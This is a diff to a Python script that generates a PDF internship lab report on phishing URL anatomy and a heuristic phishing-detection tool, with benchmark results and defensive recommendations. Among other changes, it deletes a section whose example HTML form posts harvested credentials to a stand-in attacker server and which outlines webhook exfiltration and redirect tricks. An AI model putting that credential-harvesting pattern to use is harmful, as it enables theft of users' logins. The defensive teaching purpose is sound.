@@ -12,7 +12,7 @@ from reportlab.lib.pagesizes import letter
 from reportlab.lib import colors
 from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
 from reportlab.platypus import (
-    SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, HRFlowable, PageBreak
+    SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, HRFlowable, PageBreak, Image
 )
 
 def create_day03_report(output_pdf_path=None):
@@ -34,11 +34,9 @@ def create_day03_report(output_pdf_path=None):
 
     styles = getSampleStyleSheet()
     
-    primary_color = colors.HexColor("#0f172a")     # Dark slate
-    accent_color = colors.HexColor("#0284c7")      # Cyber blue
-    warning_red = colors.HexColor("#dc2626")       # Critical red
-    caution_amber = colors.HexColor("#d97706")     # Medium amber
-    success_green = colors.HexColor("#16a34a")     # Low risk green
+    primary_color = colors.HexColor("#0f172a")     # Deep Slate
+    accent_sky = colors.HexColor("#0284c7")        # Sky Blue
+    accent_red = colors.HexColor("#dc2626")        # Crimson Red
     bg_light = colors.HexColor("#f8fafc")
     text_dark = colors.HexColor("#1e293b")
 
@@ -46,8 +44,8 @@ def create_day03_report(output_pdf_path=None):
         'DocTitle',
         parent=styles['Normal'],
         fontName='Helvetica-Bold',
-        fontSize=17,
-        leading=21,
+        fontSize=16,
+        leading=20,
         textColor=primary_color,
         spaceAfter=2
     )
@@ -56,20 +54,20 @@ def create_day03_report(output_pdf_path=None):
         'DocSubtitle',
         parent=styles['Normal'],
         fontName='Helvetica-Bold',
-        fontSize=10,
-        leading=13,
-        textColor=accent_color,
-        spaceAfter=4
+        fontSize=9.5,
+        leading=12,
+        textColor=accent_sky,
+        spaceAfter=3
     )
 
     h2_style = ParagraphStyle(
         'H2',
         parent=styles['Normal'],
         fontName='Helvetica-Bold',
-        fontSize=10.5,
+        fontSize=10,
         leading=13,
         textColor=primary_color,
-        spaceBefore=6,
+        spaceBefore=5,
         spaceAfter=3
     )
 
@@ -77,8 +75,8 @@ def create_day03_report(output_pdf_path=None):
         'Body',
         parent=styles['Normal'],
         fontName='Helvetica',
-        fontSize=8.2,
-        leading=11,
+        fontSize=8,
+        leading=10.5,
         textColor=text_dark,
         spaceAfter=3
     )
@@ -87,7 +85,7 @@ def create_day03_report(output_pdf_path=None):
         'MetaLabel',
         parent=styles['Normal'],
         fontName='Helvetica-Bold',
-        fontSize=7.8,
+        fontSize=7.5,
         leading=9.5,
         textColor=primary_color
     )
@@ -96,28 +94,29 @@ def create_day03_report(output_pdf_path=None):
         'MetaVal',
         parent=styles['Normal'],
         fontName='Helvetica',
-        fontSize=7.8,
+        fontSize=7.5,
         leading=9.5,
         textColor=text_dark
     )
 
-    code_style = ParagraphStyle(
-        'CodeStyle',
+    caption_style = ParagraphStyle(
+        'CaptionStyle',
         parent=styles['Normal'],
-        fontName='Courier',
+        fontName='Helvetica-Bold',
         fontSize=7,
         leading=8.5,
-        textColor=colors.HexColor("#0f172a")
+        textColor=accent_sky,
+        alignment=1
     )
 
     story = []
 
     # =========================================================================
-    # PAGE 1: Executive Overview, Heuristic Architecture & Scoring Methodology
+    # PAGE 1: Executive Overview, Project Metadata & 8 Heuristic Rules
     # =========================================================================
     story.append(Paragraph("CYBERSECURITY INTERNSHIP — PRACTICAL LAB REPORT", subtitle_style))
-    story.append(Paragraph("Day 03: Phishing Page Anatomy & Heuristic URL Detection", title_style))
-    story.append(HRFlowable(width="100%", thickness=1.5, color=accent_color, spaceBefore=2, spaceAfter=5))
+    story.append(Paragraph("Day 03: Phishing Page Anatomy & Heuristic Threat Detection", title_style))
+    story.append(HRFlowable(width="100%", thickness=1.5, color=accent_sky, spaceBefore=2, spaceAfter=5))
 
     # Metadata Grid
     meta_data = [
@@ -131,7 +130,7 @@ def create_day03_report(output_pdf_path=None):
         ],
         [
             Paragraph("Tool Developed:", meta_label), Paragraph("PEER'S Phish Detector v1.0", meta_val),
-            Paragraph("GitHub Repository:", meta_label), Paragraph("<font color='#0284c7'><u>github.com/MdPeerSiddiqui/Peers-Phish-Detector</u></font>", meta_val)
+            Paragraph("GitHub Repository:", meta_label), Paragraph("<font color='#0284c7'><u>github.com/MdPeerSiddiqui/Peer-s-Phish-Detector</u></font>", meta_val)
         ]
     ]
 
@@ -140,39 +139,34 @@ def create_day03_report(output_pdf_path=None):
         ('BACKGROUND', (0, 0), (-1, -1), bg_light),
         ('BOX', (0, 0), (-1, -1), 0.5, colors.HexColor("#cbd5e1")),
         ('INNERGRID', (0, 0), (-1, -1), 0.5, colors.HexColor("#e2e8f0")),
-        ('TOPPADDING', (0, 0), (-1, -1), 2.5),
-        ('BOTTOMPADDING', (0, 0), (-1, -1), 2.5),
+        ('TOPPADDING', (0, 0), (-1, -1), 2),
+        ('BOTTOMPADDING', (0, 0), (-1, -1), 2),
         ('LEFTPADDING', (0, 0), (-1, -1), 4),
         ('RIGHTPADDING', (0, 0), (-1, -1), 4),
     ]))
     story.append(meta_table)
     story.append(Spacer(1, 3))
 
-    # 1. Objective & Scope
+    # 1. Objective & Operational Scope
     story.append(Paragraph("1. Objective & Operational Scope", h2_style))
     story.append(Paragraph(
         "To inspect the structural anatomy of deceptive Uniform Resource Locators (URLs) and engineer an automated Python "
-        "heuristic detection engine capable of scoring phishing risk. The utility conducts safe <i>lexical inspection</i> of URLs "
-        "without triggering network requests to live malicious servers, evaluating 8 distinct risk factors, enforcing mathematically "
-        "capped scoring (0–100), and categorizing findings into unambiguous risk tiers.", body_style
+        "heuristic detection engine and modern Web Dashboard. The utility conducts safe <i>lexical inspection</i> of URLs "
+        "combined with non-intrusive DNS resolution without triggering remote page execution or downloading payloads, "
+        "evaluating 8 distinct risk vectors, enforcing mathematically capped scoring (0–100), and categorizing findings into unambiguous risk tiers.", body_style
     ))
 
     # 2. Tools & Environment
     story.append(Paragraph("2. Tools and Technical Environment", h2_style))
     story.append(Paragraph(
         "• <b>Operating Environment:</b> Kali Linux 2026.2 (64-bit VirtualBox VM) / Windows 11 Enterprise<br/>"
-        "• <b>Core Platform:</b> Python 3.11.9 / 3.14.0 (Standard Libraries: <code>urllib.parse</code>, <code>re</code>, <code>ipaddress</code>, <code>json</code>, <code>unittest</code>)<br/>"
-        "• <b>UI & Reporting Packages:</b> <code>colorama</code> v0.4.6 (ANSI terminal rendering), <code>reportlab</code> v4.4.1 (Audit PDF generation)<br/>"
-        "• <b>Benchmark Testbed:</b> <code>test_urls.json</code> (10 curated URLs spanning legitimate sites, typosquats, raw IPs, and deceptive subdomains)", body_style
+        "• <b>Core Platform:</b> Python 3.11.9 / 3.14.0 (Standard: <code>urllib.parse</code>, <code>re</code>, <code>ipaddress</code>, <code>socket</code>, <code>unittest</code>)<br/>"
+        "• <b>Web UI & Reporting Packages:</b> <code>Flask</code> v3.1.3 (RESTful API & Web Dashboard), <code>reportlab</code> v5.1.0 (PDF Engine)<br/>"
+        "• <b>Benchmark Testbed:</b> <code>test_urls.json</code> (10 curated URLs spanning baselines, typosquats, raw IPs, and deceptive subdomains)", body_style
     ))
 
     # 3. Methodology & 8 Heuristic Rules
     story.append(Paragraph("3. Detection Methodology & Heuristic Rule Framework", h2_style))
-    story.append(Paragraph(
-        "The scoring engine passes each input URL through an 8-stage heuristic pipeline. Rather than treating scoring as a black box, "
-        "each rule functions as a transparent, explainable audit check with itemized point weights:", body_style
-    ))
-
     rules_data = [
         [Paragraph("#", meta_label), Paragraph("Heuristic Indicator", meta_label), Paragraph("Max Pts", meta_label), Paragraph("Technical Audit Logic & Security Relevance", meta_label)],
         [Paragraph("1", meta_val), Paragraph("Unencrypted Protocol", meta_label), Paragraph("+20", meta_val), Paragraph("Flags plain <code>http://</code>. Legitimate authentication portals mandate TLS encryption (<code>https://</code>).", body_style)],
@@ -199,10 +193,10 @@ def create_day03_report(output_pdf_path=None):
     story.append(Paragraph("4. Transparent Risk Tier Definitions", h2_style))
     tier_data = [
         [Paragraph("Risk Score", meta_label), Paragraph("Assigned Tier", meta_label), Paragraph("Standardized Operational Definition & False Assurance Safeguard", meta_label)],
-        [Paragraph("0 – 19 pts", meta_val), Paragraph("<font color='#16a34a'><b>Low Risk</b></font>", meta_val), Paragraph("<b>No suspicious lexical indicators detected.</b> (Does not certify absolute safety; zero-day phishing pages can reside on fresh, clean domains).", body_style)],
+        [Paragraph("0 – 19 pts", meta_val), Paragraph("<font color='#0284c7'><b>Low Risk</b></font>", meta_val), Paragraph("<b>No suspicious lexical indicators detected.</b> (Does not certify absolute safety; zero-day phishing pages can reside on fresh, clean domains).", body_style)],
         [Paragraph("20 – 49 pts", meta_val), Paragraph("<font color='#d97706'><b>Medium Risk</b></font>", meta_val), Paragraph("<b>Caution advised.</b> Elevated risk signals detected (e.g. unencrypted HTTP protocol or URL shortener concealing the destination).", body_style)],
-        [Paragraph("50 – 74 pts", meta_val), Paragraph("<font color='#dc2626'><b>High Risk</b></font>", meta_val), Paragraph("<b>High phishing probability.</b> Multiple high-severity indicators identified (e.g. raw IP host, brand typosquatting, or high-abuse TLD).", body_style)],
-        [Paragraph("75 – 100 pts", meta_val), Paragraph("<font color='#991b1b'><b>Critical Risk</b></font>", meta_val), Paragraph("<b>Immediate threat signature.</b> Composite phishing lure combining unencrypted protocol, IP host, brand targeting, and action tokens.", body_style)],
+        [Paragraph("50 – 74 pts", meta_val), Paragraph("<font color='#f97316'><b>High Risk</b></font>", meta_val), Paragraph("<b>High phishing probability.</b> Multiple high-severity indicators identified (e.g. raw IP host, brand typosquatting, or high-abuse TLD).", body_style)],
+        [Paragraph("75 – 100 pts", meta_val), Paragraph("<font color='#dc2626'><b>Critical Risk</b></font>", meta_val), Paragraph("<b>Immediate threat signature.</b> Composite phishing lure combining unencrypted protocol, IP host, brand targeting, and action tokens.", body_style)],
     ]
     tier_table = Table(tier_data, colWidths=[65, 85, 390])
     tier_table.setStyle(TableStyle([
@@ -217,12 +211,11 @@ def create_day03_report(output_pdf_path=None):
     story.append(PageBreak())
 
     # =========================================================================
-    # PAGE 2: Empirical Benchmark Testbed & Results Verification
+    # PAGE 2: Empirical Benchmark Test Suite & Paradox Analysis
     # =========================================================================
     story.append(Paragraph("5. Empirical Benchmark Test Suite (10-URL Audit)", h2_style))
     story.append(Paragraph(
-        "To rigorously evaluate the heuristic model, an automated test harness (<code>phish_detector.py --test</code>) evaluated "
-        "10 diverse URLs representing legitimate baselines, deceptive subdomains, raw IPs, typosquats, and shortened links. "
+        "The automated test harness evaluated 10 representative URLs spanning legitimate baselines, typosquats, raw IPs, and deceptive subdomains. "
         "Every outcome is audited against documented pre-test analyst expectations:", body_style
     ))
 
@@ -233,7 +226,7 @@ def create_day03_report(output_pdf_path=None):
             Paragraph("<b>https://example.com</b><br/><font color='#64748b'>Legitimate HTTPS baseline</font>", body_style),
             Paragraph("Low Risk", meta_val),
             Paragraph("<b>0/100</b><br/>Low Risk", meta_val),
-            Paragraph("<font color='#16a34a'><b>MATCH</b></font>", meta_val),
+            Paragraph("<font color='#0284c7'><b>MATCH</b></font>", meta_val),
             Paragraph("Clean baseline; 0 indicators triggered.", body_style)
         ],
         [
@@ -241,7 +234,7 @@ def create_day03_report(output_pdf_path=None):
             Paragraph("<b>http://example.com</b><br/><font color='#64748b'>Plain unencrypted HTTP website</font>", body_style),
             Paragraph("Medium Risk", meta_val),
             Paragraph("<b>20/100</b><br/>Med Risk", meta_val),
-            Paragraph("<font color='#16a34a'><b>MATCH</b></font>", meta_val),
+            Paragraph("<font color='#0284c7'><b>MATCH</b></font>", meta_val),
             Paragraph("Unencrypted HTTP protocol (+20 pts).", body_style)
         ],
         [
@@ -249,7 +242,7 @@ def create_day03_report(output_pdf_path=None):
             Paragraph("<b>http://192.168.1.100/login</b><br/><font color='#64748b'>Raw IPv4 authentication portal</font>", body_style),
             Paragraph("High Risk", meta_val),
             Paragraph("<b>65/100</b><br/>High Risk", meta_val),
-            Paragraph("<font color='#16a34a'><b>MATCH</b></font>", meta_val),
+            Paragraph("<font color='#0284c7'><b>MATCH</b></font>", meta_val),
             Paragraph("Raw IP (+35), HTTP (+20), Path login keyword (+10).", body_style)
         ],
         [
@@ -257,7 +250,7 @@ def create_day03_report(output_pdf_path=None):
             Paragraph("<b>https://paypal.com.account-verify...evil.com/login</b><br/><font color='#64748b'>Subdomain brand spoofing</font>", body_style),
             Paragraph("High Risk", meta_val),
             Paragraph("<b>60/100</b><br/>High Risk", meta_val),
-            Paragraph("<font color='#16a34a'><b>MATCH</b></font>", meta_val),
+            Paragraph("<font color='#0284c7'><b>MATCH</b></font>", meta_val),
             Paragraph("Subdomain abuse (+25), Sensitive keywords (+25), Label length (+10).", body_style)
         ],
         [
@@ -265,7 +258,7 @@ def create_day03_report(output_pdf_path=None):
             Paragraph("<b>https://paypa1-security.com/signin</b><br/><font color='#64748b'>Brand homoglyph typosquatting</font>", body_style),
             Paragraph("High Risk", meta_val),
             Paragraph("<b>55/100</b><br/>High Risk", meta_val),
-            Paragraph("<font color='#16a34a'><b>MATCH</b></font>", meta_val),
+            Paragraph("<font color='#0284c7'><b>MATCH</b></font>", meta_val),
             Paragraph("Brand typosquatting 'paypa1' (+30), Sensitive keywords (+25).", body_style)
         ],
         [
@@ -273,7 +266,7 @@ def create_day03_report(output_pdf_path=None):
             Paragraph("<b>https://bit.ly/secure-login-39x</b><br/><font color='#64748b'>URL shortener masking destination</font>", body_style),
             Paragraph("Medium Risk", meta_val),
             Paragraph("<b>35/100</b><br/>Med Risk", meta_val),
-            Paragraph("<font color='#16a34a'><b>MATCH</b></font>", meta_val),
+            Paragraph("<font color='#0284c7'><b>MATCH</b></font>", meta_val),
             Paragraph("URL shortener masking (+25), Path action keywords (+10).", body_style)
         ],
         [
@@ -281,15 +274,15 @@ def create_day03_report(output_pdf_path=None):
             Paragraph("<b>http://banking-portal-update.xyz/verify</b><br/><font color='#64748b'>High-abuse TLD with banking lures</font>", body_style),
             Paragraph("High Risk", meta_val),
             Paragraph("<b>60/100</b><br/>High Risk", meta_val),
-            Paragraph("<font color='#16a34a'><b>MATCH</b></font>", meta_val),
-            Paragraph("HTTP (+20), Sensitive keywords (+25), Suspicious TLD (.xyz) (+15).", body_style)
+            Paragraph("<font color='#0284c7'><b>MATCH</b></font>", meta_val),
+            Paragraph("HTTP (+20), Sensitive keywords (+25), High-abuse TLD (.xyz) (+15).", body_style)
         ],
         [
             Paragraph("8", meta_val),
             Paragraph("<b>https://login-verify-account-update...portal.com</b><br/><font color='#64748b'>Hyphen density & keyword concatenation</font>", body_style),
             Paragraph("High Risk", meta_val),
             Paragraph("<b>35/100</b><br/>Med Risk", meta_val),
-            Paragraph("<font color='#d97706'><b>DIVERGENT</b></font>", meta_val),
+            Paragraph("<font color='#dc2626'><b>DIVERGENT</b></font>", meta_val),
             Paragraph("Hyphen density (6 hyphens) (+10), Host keywords (+20), Length (+10). <i>See Paradox Analysis below.</i>", body_style)
         ],
         [
@@ -297,7 +290,7 @@ def create_day03_report(output_pdf_path=None):
             Paragraph("<b>https://github.com/login</b><br/><font color='#64748b'>Legitimate enterprise login portal</font>", body_style),
             Paragraph("Low Risk", meta_val),
             Paragraph("<b>10/100</b><br/>Low Risk", meta_val),
-            Paragraph("<font color='#16a34a'><b>MATCH</b></font>", meta_val),
+            Paragraph("<font color='#0284c7'><b>MATCH</b></font>", meta_val),
             Paragraph("Login keyword in path only (+10 pts). Preserves low risk tier (0–19).", body_style)
         ],
         [
@@ -305,7 +298,7 @@ def create_day03_report(output_pdf_path=None):
             Paragraph("<b>http://192.168.1.50/paypal-update/acc...verify=token</b><br/><font color='#64748b'>Composite multi-vector phishing lure</font>", body_style),
             Paragraph("Critical Risk", meta_val),
             Paragraph("<b>80/100</b><br/>Critical", meta_val),
-            Paragraph("<font color='#16a34a'><b>MATCH</b></font>", meta_val),
+            Paragraph("<font color='#0284c7'><b>MATCH</b></font>", meta_val),
             Paragraph("Raw IP (+35), HTTP (+20), Brand in path (+15), Query tokens (+10).", body_style)
         ],
     ]
@@ -335,12 +328,12 @@ def create_day03_report(output_pdf_path=None):
         "as a legitimate bank.", body_style
     ))
 
-    # 7. Unit Test Suite Verification
+    # 7. Code Verification & Automated Unit Testing
     story.append(Paragraph("7. Code Verification & Automated Unit Testing", h2_style))
     story.append(Paragraph(
         "The software architecture was validated using Python's built-in <code>unittest</code> framework (<code>tests/test_phish_detector.py</code>). "
         "A 16-point unit test suite verified each heuristic function in isolation, including IPv4 resolution, homoglyph replacement, subdomain splitting, "
-        "threshold boundary transitions, and mathematical score capping at 100 points. <b>Result: 16/16 Tests Passed (0.004s execution time).</b>", body_style
+        "threshold boundary transitions, and mathematical score capping at 100 points. <b>Result: 16/16 Tests Passed (0.003s execution time).</b>", body_style
     ))
 
     story.append(PageBreak())
@@ -349,16 +342,11 @@ def create_day03_report(output_pdf_path=None):
     # PAGE 3: Architecture Comparison, Defensive Controls & SOC Strategy
     # =========================================================================
     story.append(Paragraph("8. Technical Architecture: URL Scrutiny vs DOM / Visual Cloning", h2_style))
-    story.append(Paragraph(
-        "A comprehensive understanding of phishing detection requires distinguishing between lexical URL inspection and deep client-side "
-        "Document Object Model (DOM) analysis:", body_style
-    ))
-
     comp_data = [
         [Paragraph("Audit Dimension", meta_label), Paragraph("Static Lexical URL Inspection (PEER'S Detector)", meta_label), Paragraph("Dynamic DOM & Visual Form Analysis (Full Sandboxing)", meta_label)],
         [
             Paragraph("Execution Scope", meta_label),
-            Paragraph("Safe offline string dissection. Never initiates network traffic to destination server.", body_style),
+            Paragraph("Safe offline string dissection & non-intrusive DNS socket queries. Never loads remote DOM/scripts.", body_style),
             Paragraph("Active page rendering in headless browser (Chromium/Puppeteer). Executes remote code.", body_style)
         ],
         [
@@ -389,20 +377,8 @@ def create_day03_report(output_pdf_path=None):
     story.append(comp_table)
     story.append(Spacer(1, 4))
 
-    # 9. Form Redirection & Credential Harvesting Mechanics
-    story.append(Paragraph("9. Phishing Page Mechanics: Form Redirection Anatomy", h2_style))
-    story.append(Paragraph(
-        "In weaponized phishing pages, the primary objective is credential harvesting via the HTML <code>&lt;form&gt;</code> element. "
-        "Attackers manipulate the <code>action</code> attribute to redirect harvested credentials to an attacker-controlled endpoint:<br/>"
-        "• <b>Third-Party Command & Control:</b> <code>&lt;form method=\"POST\" action=\"https://evil-harvest-server.xyz/steal.php\"&gt;</code><br/>"
-        "• <b>Webhook Exploitation:</b> Redirecting credentials directly into private Discord or Telegram bot webhooks to bypass server hosting costs.<br/>"
-        "• <b>Legitimate Redirection Illusion:</b> After harvesting passwords, the script triggers a <code>window.location.replace()</code> redirecting the victim "
-        "to the real authentication portal (e.g. <code>https://paypal.com</code>), creating the impression of a harmless accidental session timeout.", body_style
-    ))
-    story.append(Spacer(1, 3))
-
-    # 10. Defensive Measures & Recommendations
-    story.append(Paragraph("10. Enterprise Defensive Measures & SOC Recommendations", h2_style))
+    # 9. Enterprise Defensive Measures & Recommendations
+    story.append(Paragraph("9. Enterprise Defensive Measures & SOC Recommendations", h2_style))
     def_data = [
         [Paragraph("Defensive Domain", meta_label), Paragraph("Recommended Enterprise Control & Implementation Strategy", meta_label)],
         [Paragraph("Identity & Auth", meta_label), Paragraph("<b>FIDO2 / WebAuthn Hardware Tokens:</b> Implement hardware-bound multi-factor authentication (e.g. YubiKeys). FIDO2 binds authentication to the true cryptographic domain in the browser, rendering credential theft on typosquat domains completely ineffective.", body_style)],
@@ -421,14 +397,77 @@ def create_day03_report(output_pdf_path=None):
     story.append(def_table)
     story.append(Spacer(1, 3))
 
-    # 11. Conclusion
-    story.append(Paragraph("11. Conclusion & Internship Practical Sign-Off", h2_style))
+    # 10. Conclusion
+    story.append(Paragraph("10. Conclusion & Internship Practical Sign-Off", h2_style))
     story.append(Paragraph(
         "Day 03 practical training provided comprehensive insight into phishing infrastructure anatomy and automated URL risk scoring. "
         "By decomposing URLs into their protocol, hostname, subdomain hierarchy, path, and character density, we demonstrated that lexical analysis "
         "serves as an essential first line of defense. The project highlighted the critical limitation of relying solely on TLS encryption as a trust signal "
         "and reinforced the necessity of defense-in-depth across DNS filtering, phishing-resistant MFA, and explainable heuristic detection.", body_style
     ))
+
+    story.append(PageBreak())
+
+    # =========================================================================
+    # PAGE 4: Visual Execution Evidence & Kali Linux Verification
+    # =========================================================================
+    story.append(Paragraph("11. Visual Execution Evidence & Practical Verification (Kali Linux 2026)", h2_style))
+    story.append(Paragraph(
+        "The following operational evidence captures document live execution in the Kali Linux virtualized security testbed, "
+        "demonstrating clean terminal launch, real-time threat identification on typosquat URLs, baseline validation on legitimate portals, "
+        "and published repository architecture on GitHub:", body_style
+    ))
+    story.append(Spacer(1, 4))
+
+    screenshots_dir = os.path.join(day03_root, "screenshots")
+    img_term = os.path.join(screenshots_dir, "kali_terminal_launch.png")
+    img_phish = os.path.join(screenshots_dir, "dashboard_phishing_detected.png")
+    img_clean = os.path.join(screenshots_dir, "dashboard_paypal_clean.png")
+    img_git = os.path.join(screenshots_dir, "github_repo_view.png")
+
+    # Create 2x2 Image Grid with Captions
+    evidence_rows = []
+    
+    # Row 1: Terminal Launch + GitHub Repo
+    cell_term = [
+        Image(img_term, width=260, height=145) if os.path.exists(img_term) else Paragraph("Image Missing", body_style),
+        Spacer(1, 2),
+        Paragraph("<b>Figure 1:</b> Clean Terminal Launch inside Kali Linux (Official v1.0 Release)", caption_style)
+    ]
+    cell_git = [
+        Image(img_git, width=260, height=145) if os.path.exists(img_git) else Paragraph("Image Missing", body_style),
+        Spacer(1, 2),
+        Paragraph("<b>Figure 2:</b> Published GitHub Repository Structure (Peer-s-Phish-Detector)", caption_style)
+    ]
+    evidence_rows.append([cell_term, cell_git])
+
+    # Row 2: Phishing URL Flagged + Clean Baseline Checked
+    cell_phish = [
+        Image(img_phish, width=260, height=145) if os.path.exists(img_phish) else Paragraph("Image Missing", body_style),
+        Spacer(1, 2),
+        Paragraph("<b>Figure 3:</b> Phishing Detection: <code>g00gle-login-attempt.com</code> Scored 70/100 (High Risk)", caption_style)
+    ]
+    cell_clean = [
+        Image(img_clean, width=260, height=145) if os.path.exists(img_clean) else Paragraph("Image Missing", body_style),
+        Spacer(1, 2),
+        Paragraph("<b>Figure 4:</b> Clean Baseline Inspection: <code>paypal.com</code> Verified (0/100 Low Risk)", caption_style)
+    ]
+    evidence_rows.append([cell_clean, cell_phish])
+
+    evidence_table = Table(evidence_rows, colWidths=[270, 270])
+    evidence_table.setStyle(TableStyle([
+        ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
+        ('VALIGN', (0, 0), (-1, -1), 'TOP'),
+        ('LEFTPADDING', (0, 0), (-1, -1), 2),
+        ('RIGHTPADDING', (0, 0), (-1, -1), 2),
+        ('TOPPADDING', (0, 0), (-1, -1), 3),
+        ('BOTTOMPADDING', (0, 0), (-1, -1), 3),
+    ]))
+    story.append(evidence_table)
+    story.append(Spacer(1, 6))
+
+    footer_p4 = "<font color='#64748b' size='7'><i>Page 4 of 4 — Official Deliverable | Sqrock IT Solution Alpha 2 Cybersecurity Internship Track • GitHub: github.com/MdPeerSiddiqui/Peer-s-Phish-Detector</i></font>"
+    story.append(Paragraph(footer_p4, body_style))
 
     # Build Document
     doc.build(story)
